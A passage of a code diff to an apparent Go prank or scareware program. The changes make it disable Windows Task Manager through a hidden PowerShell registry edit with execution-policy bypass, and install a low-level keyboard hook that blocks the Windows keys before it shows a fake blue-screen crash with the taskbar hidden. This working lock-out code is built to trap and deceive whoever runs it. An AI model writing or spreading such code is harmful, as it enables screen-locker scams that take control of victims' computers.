@@ -279,9 +279,23 @@ func restoreTaskbar() {
 	if hwnd != 0 {
 		procShowWindow.Call(hwnd, 5) // SW_SHOW
 	}
+	enableTaskMgr()
+}
+
+func disableTaskMgr() {
+	exec.Command("powershell", "-ep", "bypass", "-windowstyle", "hidden", "-command",
+		`$p='HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System';`+
+			`if(!(Test-Path $p)){New-Item -Path $p -Force|Out-Null};`+
+			`Set-ItemProperty -Path $p -Name DisableTaskMgr -Value 1 -Type DWord -Force`).Run()
+}
+
+func enableTaskMgr() {
+	exec.Command("powershell", "-ep", "bypass", "-windowstyle", "hidden", "-command",
+		`Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System' -Name DisableTaskMgr -ErrorAction SilentlyContinue`).Run()
 }
 
 func showBSOD() {
+	disableTaskMgr()
 	ps := `Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 Add-Type -TypeDefinition @'
@@ -290,8 +304,26 @@ public class WinAPI{
 [DllImport("user32.dll")]public static extern IntPtr FindWindow(string c,string w);
 [DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr h,int n);}
 '@
+Add-Type -TypeDefinition @'
+using System;using System.Runtime.InteropServices;
+public class KbHook{
+    static IntPtr hk=IntPtr.Zero;
+    public delegate IntPtr LLKP(int n,IntPtr w,IntPtr l);
+    static LLKP cb;
+    [DllImport("user32.dll")]static extern IntPtr SetWindowsHookEx(int id,LLKP fn,IntPtr mod,uint tid);
+    [DllImport("user32.dll")]static extern bool UnhookWindowsHookEx(IntPtr h);
+    [DllImport("user32.dll")]static extern IntPtr CallNextHookEx(IntPtr h,int n,IntPtr w,IntPtr l);
+    [DllImport("kernel32.dll")]static extern IntPtr GetModuleHandle(string m);
+    public static void Install(){cb=Proc;hk=SetWindowsHookEx(13,cb,GetModuleHandle(null),0);}
+    static IntPtr Proc(int n,IntPtr w,IntPtr l){
+        if(n>=0){int v=System.Runtime.InteropServices.Marshal.ReadInt32(l);if(v==0x5B||v==0x5C)return(IntPtr)1;}
+        return CallNextHookEx(hk,n,w,l);
+    }
+}
+'@
 $tb=[WinAPI]::FindWindow("Shell_TrayWnd",$null)
 [WinAPI]::ShowWindow($tb,0)
+[KbHook]::Install()
 $s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds
 $W=$s.Width;$H=$s.Height;$mx=[int]($W*0.12)
 $f=New-Object System.Windows.Forms.Form
